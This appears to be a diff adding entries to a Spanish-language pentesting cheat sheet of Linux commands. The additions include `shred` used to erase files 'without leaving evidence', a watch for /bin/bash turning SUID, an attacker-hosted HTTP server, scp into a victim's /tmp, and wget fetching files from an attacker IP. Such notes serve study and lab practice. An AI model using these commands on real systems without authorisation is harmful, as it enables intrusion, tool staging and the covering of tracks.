@@ -29,6 +29,22 @@ Tags: #Linux #Comandos #Netcat #Montura #Hash
 ❯ !$                                         # Referencias el ultimo argumento que hayamos puesto en la consola 
 ```
 
+```bash 
+❯ gunzip <file.gz>                           # Para descompirmir archivos gzip
+```
+
+```bash 
+❯ shred -zun 10 -v <file>                    # Borrar un archivo, pero que el borrado sea mas complejo y asi no dejaremos evidencia, a mas valor que el 10 es mejor, ademas de borrarlo evita que se pueda recuperar
+```
+
+```bash 
+❯ watch -n 1 ls -l /bin/bash                 # Monitorizar la bash cada segundo con el siguiente comando y ver cuando cambia a SUID
+```
+
+```bash 
+❯ extractPorts <filename>                    # Herramienta que nos ayuda extraer los puerto de la captura de Nmap y copiarlos a la clipboard 
+```
+
 ```bash
 ❯ ping -c 1 ❮IP❯                             # Para saber si la maquina esta activa o no (ttl=64 Linux, ttl=128 Windows)
 
@@ -114,10 +130,17 @@ Tags: #Linux #Comandos #Netcat #Montura #Hash
 	# p = File to attack 'File.zip'
 ```
 
+Modos de transferir archivos desde la maquina de atacante 
 ```bash
 ❯ python3 -m http.server 80                 # Nos montamos un servidor http 80
+
+❯ scp <file> root@<IP>:/tmp/chisel          # Podemos tranferir un archivo y lo depositamos en la ruta que hayamos colocado
+	# root = Usuario de la maquina victima 
+	# IP = Direccion de la maquina victima 
+	# file = Archivo a transferir 
 ```
 
+Manera de descargar archivos en la maquina victima 
 ```bash
 ❯ wget http://❮IP❯/❮File❯                   # Para poder cargar o descargar un archivo especifico desde una IP de atacante
 ```
